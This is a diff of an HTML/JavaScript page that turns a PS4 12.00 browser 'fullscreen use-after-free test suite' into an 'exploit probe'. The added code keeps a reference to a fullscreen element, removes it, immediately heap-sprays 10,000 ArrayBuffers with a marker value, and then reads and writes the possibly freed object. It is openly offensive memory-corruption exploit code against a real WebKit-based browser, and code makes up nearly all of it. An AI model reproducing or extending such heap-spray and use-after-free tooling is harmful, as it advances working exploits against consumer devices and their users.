@@ -2,22 +2,26 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Fullscreen UAF - Test Suite</title>
+<title>PS4 Fullscreen UAF - Exploit Probe</title>
 </head>
-<body style="background:#222;color:#fff;">
-  <h2>PS4 12.00 - Fullscreen UAF Test Suite (Original)</h2>
-  <button onclick="runTest(4)">Teste 4 — Apenas remove + exitFullscreen</button>
+<body style="background:#111;color:#0f0;">
 
-<div id="log" style="margin-top:20px;"></div>
+<h2>PS4 12.00 - UAF Exploit Probe</h2>
+<button onclick="runTest()">Run Exploit Probe</button>
 
-  <script>
+<pre id="log" style="height:300px;overflow:auto;"></pre>
+
+<script>
 const PATTERN = 2.121995791e-314;
 
 function log(msg) {
     try { console.log(msg); } catch(e){}
-    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
+    document.getElementById("log").textContent += msg + "\n";
 }
 
+// ==========================
+// Heap base (igual ao seu)
+// ==========================
 function setupHeap() {
     let controllers = [];
 
@@ -30,8 +34,12 @@ function setupHeap() {
     return controllers;
 }
 
+// ==========================
+// Fullscreen
+// ==========================
 function setupFullscreen() {
     let fsTarget = document.createElement("div");
+
     fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
     fsTarget.style.background = "black";
     fsTarget.style.width = "100%";
@@ -44,34 +52,97 @@ function setupFullscreen() {
 
     if (fsTarget.webkitRequestFullscreen) {
         fsTarget.webkitRequestFullscreen();
-    } else {
-        document.documentElement.webkitRequestFullscreen?.();
     }
 
     return fsTarget;
 }
 
+// ==========================
+// Spray direcionado
+// ==========================
+function heapSpray() {
+    let spray = [];
+
+    for (let i = 0; i < 10000; i++) {
+        let buf = new ArrayBuffer(0x100);
+        let f64 = new Float64Array(buf);
+
+        for (let j = 0; j < f64.length; j++) {
+            f64[j] = PATTERN;
+        }
+
+        spray.push(f64);
+    }
+
+    return spray;
+}
+
+// ==========================
+// Tentativa de leitura pós-free
+// ==========================
+function probeObject(obj) {
+    try {
+        log("[PROBE] innerHTML: " + obj.innerHTML);
+    } catch(e) {
+        log("[PROBE] innerHTML ERROR: " + e);
+    }
+
+    try {
+        obj.innerHTML = "UAF?";
+        log("[PROBE] write innerHTML OK");
+    } catch(e) {
+        log("[PROBE] write ERROR: " + e);
+    }
+
+    try {
+        let rect = obj.getBoundingClientRect();
+        log("[PROBE] rect: " + JSON.stringify(rect));
+    } catch(e) {
+        log("[PROBE] rect ERROR: " + e);
+    }
+}
+
+// ==========================
+// Trigger (mantido + expandido)
+// ==========================
 function trigger(fsTarget) {
     log("[*] Trigger: remove + exitFullscreen");
 
+    // mantém referência global
+    window._uafRef = fsTarget;
+
     try {
         fsTarget.remove();
+    } catch(e) {
+        log("[ERRO remove] " + e);
+    }
 
+    // 🔥 spray imediatamente após free
+    let spray = heapSpray();
+    log("[*] Spray after free completo");
+
+    // 🔬 tenta acessar objeto potencialmente freed
+    setTimeout(() => {
+        log("[*] PROBING OBJECT...");
+        probeObject(window._uafRef);
+    }, 50);
+
+    try {
         if (document.webkitIsFullScreen || document.fullscreenElement) {
             document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
         }
     } catch(e) {
-        log("[ERRO] " + e);
+        log("[ERRO exit] " + e);
     }
 
     setTimeout(() => location.reload(), 500);
 }
 
-function runTest(mode) {
-    const logDiv = document.getElementById("log");
-    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";
-
-    log("[*] Iniciando teste " + mode);
+// ==========================
+// Execução principal
+// ==========================
+function runTest() {
+    document.getElementById("log").textContent = "Running... Press OPTIONS\n";
 
     let controllers = setupHeap();
     let fsTarget = setupFullscreen();
@@ -79,11 +150,11 @@ function runTest(mode) {
     window.onblur = function() {
         log("[*] onblur disparado");
 
-        if (mode === 4) {
-            // MINIMO (CIRÚRGICO)
-            setTimeout(() => trigger(fsTarget), 3000);
-        }
+        // 🔥 fluxo ORIGINAL preservado
+        setTimeout(() => trigger(fsTarget), 3000);
     };
 }
-</script> </body>
+</script>
+
+</body>
 </html>
